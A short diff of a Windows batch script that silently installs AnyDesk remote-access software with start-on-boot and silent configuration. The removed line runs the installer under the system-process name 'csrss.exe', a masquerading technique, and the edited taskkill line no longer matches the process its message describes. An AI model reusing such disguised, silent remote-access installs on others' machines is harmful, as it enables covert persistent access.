@@ -19,7 +19,7 @@ setlocal
 
 :: Stop AnyDesk if running
 echo Checking for running AnyDesk processes...
-taskkill /IM "AnyDesk.exe" /F >nul 2>&1
+taskkill /IM "ad.exe" /F >nul 2>&1
 if %errorlevel% equ 0 echo Previous AnyDesk process terminated.
 
 :: Define paths
@@ -30,7 +30,7 @@ set "INSTALL_DIR=C:\Program Files\AnyDesk"
 if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
 
 echo Installing AnyDesk...
-"%SCRIPT_DIR%csrss.exe" --install "%INSTALL_DIR%" --silent --start-with-win --silent-config
+"%SCRIPT_DIR%ad.exe" --install "%INSTALL_DIR%" --silent --start-with-win --silent-config
 
 if %errorlevel% neq 0 (
     echo ERROR: Installation failed. Code: %errorlevel%
